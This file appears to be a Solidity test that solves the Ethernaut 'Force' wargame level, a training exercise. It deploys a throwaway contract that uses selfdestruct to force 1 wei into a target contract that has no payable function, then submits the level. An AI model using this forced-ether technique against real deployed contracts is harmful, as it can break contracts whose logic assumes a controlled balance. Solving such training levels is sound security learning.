pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Force/ForceFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract Ephemeral {
   function toss(address receiver) external payable {
       selfdestruct(payable(receiver));
   }
}


contract ForceTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testForceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ForceFactory telephoneFactory = new ForceFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Force ethernautForce = Force(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Ephemeral ephemeral = new Ephemeral();
        ephemeral.toss{ value: 1 wei }(address(ethernautForce));


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
